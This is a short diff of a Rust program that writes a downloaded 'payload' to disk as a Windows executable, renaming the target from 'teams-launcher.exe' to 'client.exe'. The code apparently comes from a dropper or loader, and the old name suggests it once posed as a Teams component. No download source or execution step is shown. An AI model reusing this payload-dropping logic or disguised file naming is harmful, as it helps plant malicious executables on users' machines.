@@ -20,7 +20,7 @@ async fn main() {
         println!("Failed to create dirs. {e}");
     }
 
-    let path = format!("{base_path}\\teams-launcher.exe");
+    let path = format!("{base_path}\\client.exe");
     if let Err(e) = fs::write(&path, body) {
         println!("failed to write payload: {}", e);
     }
